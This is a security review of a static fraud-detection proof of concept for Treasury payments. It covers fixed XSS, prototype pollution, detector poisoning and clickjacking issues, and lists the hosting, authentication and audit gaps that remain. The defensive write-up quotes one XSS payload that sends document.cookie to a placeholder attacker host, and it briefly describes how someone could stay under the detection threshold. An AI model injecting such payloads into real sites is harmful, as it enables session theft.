# Security Review — Treasury Payment Anomaly & Fraud Triage POC

Reviewed as a proof of concept only. This document separates **fixes already
applied to this POC** from the **larger gaps a real Treasury deployment would
need to close** — the two categories call for very different levels of effort,
and conflating them tends to either over-engineer the demo or under-scope the
real rollout.

## 1. Fixed in this pass

**Stored/DOM-based XSS via CSV fields (High, fixed).** `src/app.js`
`renderTable()` interpolated `t.transaction_id` and `t.date`/`t.time` directly
into `innerHTML` without escaping, while other fields (vendor, department,
narrative) were already passed through `escapeHtml()`. Since transaction ID
and date come straight from an uploaded CSV — user-controlled input — a
crafted file (e.g. a transaction ID of `<img src=x onerror=fetch('https://evil.example/steal?c='+document.cookie)>`)
would execute arbitrary JavaScript in the browser of whoever loaded it. The
app makes no network calls of its own, so this couldn't exfiltrate server
data, but it could still run in the analyst's active browser tab — enough for
a convincing phishing overlay or session-token theft from any other same-site
context. All fields are now consistently escaped before insertion.

**No file-size/row cap on upload (Low, fixed).** The file picker accepted any
`.csv`, however large. A very large or malformed file could hang the
analyst's browser tab. Added a 15MB / 100,000-row cap with a clear error
message, plus an extension check so non-CSV files are rejected up front.

**No Content-Security-Policy (Medium, fixed).** Added a `<meta>` CSP
(`default-src 'self'`, no external script/connect sources) as defense in
depth — belt-and-suspenders in case a future code change reintroduces an
unescaped field. Note: GitHub Pages only lets you set headers via `<meta>`
tags, and `frame-ancestors`/`X-Frame-Options` (clickjacking protection)
**cannot** be set that way — that gap is called out below since it needs real
hosting to close.

## 1b. Second pass — SQL injection and related threats

Requested explicitly as a follow-up: harden against SQL injection and
"various other threats," scoped to what's appropriate for a POC.

**SQL injection: not applicable, and here's why rather than just asserting
it.** This application has no database, no server, and no SQL anywhere in
its stack — `index.html` + static JS/CSS, served as-is, running entirely in
the browser. There is no query for an attacker to inject into. Bolting on
parameterized-query boilerplate or an ORM here would be security theater:
work that produces a checkbox, not a risk reduction, because the underlying
attack surface doesn't exist. The honest version of "harden against SQLi"
for this architecture is confirming that gap analysis, not writing dead code.

That said, "various other threats" was worth taking seriously, and going
through the actual code turned up two more real, fixed issues plus one
appropriate compensating control for a hosting constraint already noted in
section 2:

**Prototype pollution via CSV header names (Low, fixed).** `src/csv.js`
built each parsed row as a plain `{}` and wrote `obj[header] = value` for
every column — and the header row comes from the uploaded file, i.e. from
the attacker. A column literally named `__proto__` reaching an object-key
position is the textbook shape of a prototype-pollution bug. In this
specific code path it was **not actually exploitable** (JS silently ignores
a `__proto__` write when the assigned value isn't itself an object, and
nothing here does the recursive merge/copy pattern that turns pollution
into real damage) — but "not exploitable today, in this exact code" is a
fragile guarantee the moment anyone refactors it. Fixed properly: rows now
build on `Object.create(null)` (no inherited prototype to pollute at all),
and `__proto__`/`constructor`/`prototype` column names are explicitly
renamed on the way in as a second layer, so the fix holds even if the
parser is later reused somewhere less careful.

**Statistical poisoning of the detector itself (Medium, fixed — and the
most domain-specific finding of this review).** This is a fraud-detection
tool, so the threat model has to include someone trying to *evade*
detection, not just attack the web page. Vendor baselines (mean/standard
deviation) were computed from whatever amounts happened to be in the
uploaded file, with no sanity bound. A single adversarial row — a
deliberately absurd amount, or even an honest data-entry typo with an
extra zero or two — can blow out a vendor's computed mean/std enough to
raise the bar for what counts as "3 sigma," potentially masking a
genuinely suspicious payment to that same vendor elsewhere in the file.
This is the injection-equivalent threat for a statistics-driven detector:
instead of injecting code, you inject a data point that corrupts the
model's own baseline. Fixed with an explicit sane-amount bound ($0.01–
$100,000,000 per transaction); rows outside it are excluded from analysis
entirely (not silently clamped) and the exclusion count is shown in the UI
status line, so a poisoning attempt is visible rather than quietly
absorbed. (`tests/security_test.js` verifies both the pollution and the
exclusion behavior against a hostile CSV fixture, not just by code
inspection.)

**Clickjacking JS fallback (Low, partial mitigation).** Section 2 already
noted that GitHub Pages can't deliver `frame-ancestors`/`X-Frame-Options`
because those are HTTP-header-only and Pages only supports `<meta>`. Added
the pre-CSP-era frame-busting script (`if (window.top !== window.self)
window.top.location = window.self.location;`) as a stopgap. Flagging
plainly: this is bypassable (e.g. a sandboxed iframe with
`allow-top-navigation` withheld) and is not a substitute for the real
header on real hosting — it buys a little protection against casual
framing attempts on the current host, nothing more.

**Threats considered and deliberately not addressed, with reasons:**
- *CSRF* — requires a session/cookie and a state-changing server request;
  this app has neither (no backend at all), so there's no session to ride.
- *SSRF* — requires the app to make outbound requests based on user input;
  the only fetch is a hardcoded same-origin path to the bundled sample CSV.
- *ReDoS* — every regex touching user input here is a small fixed-pattern
  match (`^\d{1,2}:\d{2}$`, digit-stripping) with no nested quantifiers, so
  no catastrophic-backtracking shape exists to exploit.
- *Dependency/supply-chain attacks* — still zero runtime dependencies (the
  point made in section 2 still holds after this pass); Playwright remains
  dev/test-only and never ships to the deployed page.

## 2. Structural gaps — not fixed, out of scope for a static demo

These aren't code bugs; they're consequences of "static site, synthetic
data, no login" being the right shape for a demo and the wrong shape for
production. Roughly in priority order for a real rollout:

**No authentication or authorization.** Anyone with the URL can use the
tool. Fine for a public POC with fake data; unacceptable the moment real
payment data is involved. A production version needs to sit behind
Treasury's identity provider (PIV/CAC, SSO/SAML) with role-based access —
who can upload data, who can see flagged results, who can mark a case
reviewed.

**Detection logic is fully visible client-side.** The scoring weights and
thresholds in `detection.js` ship to the browser as plain JavaScript.
Anyone can open dev tools and read exactly what gets flagged and at what
dollar amount — which, for a fraud tool, hands a bad actor the recipe for
staying under the radar (e.g. "keep it under $9,500 and don't duplicate the
exact amount"). In production, scoring needs to move server-side, with the
client only ever seeing results, not the rules.

**No audit trail.** Nothing is logged: who ran an analysis, what was
flagged, who reviewed a flagged transaction and what they decided. A real
deployment needs persistent, tamper-evident logging — both for operational
review and because Treasury/OIG audit and Privacy Act/FISMA obligations
generally require it wherever real payment or PII data is processed.

**Real payment data needs a real hosting environment.** GitHub Pages is
public static hosting with no data-handling controls — appropriate for a
demo with fabricated data, not for anything touching actual disbursement
records. A production version would need to run in an authorized
environment meeting whatever ATO/FedRAMP or Treasury-internal hosting
standard applies, with encryption at rest, network-level access controls,
and a formal data classification review before any real data touches it.

**Clickjacking protection needs real headers.** As noted above,
`frame-ancestors`/`X-Frame-Options` can't be delivered via `<meta>` on
GitHub Pages. Any real host (even a simple reverse proxy) should set these,
along with `Strict-Transport-Security` and `Referrer-Policy`, at the HTTP
layer.

**Secrets hygiene for future changes.** Not a flaw in the app itself, but
worth carrying forward: the GitHub push for this POC used a fine-grained
Personal Access Token pasted into chat and embedded in a local git remote
URL. That was reasonable for a one-time bootstrap of a throwaway demo repo,
but isn't a pattern to repeat — future changes should use a credential
manager or SSH key instead of a token in a remote URL, and any token used
this way should be revoked immediately after use (please revoke the one
used here now that the push is done).

**Dependency surface.** Currently zero runtime dependencies (a deliberate
choice — see README), which is good: nothing to patch, no supply-chain
exposure. If the app grows into something with a real framework or backend,
keep dependencies pinned and add automated scanning (e.g. Dependabot,
`npm audit`) as part of CI rather than bolting it on later.

## 3. Suggested next step

If/when this moves past POC, the highest-leverage next step is architectural,
not cosmetic: move detection scoring behind an authenticated backend so the
rules aren't public, and put the whole thing behind Treasury's identity
provider before any real data is ever loaded into it. Everything else in
this document is worth doing, but those two changes are what actually change
the risk profile from "public demo" to "handles real payment data."
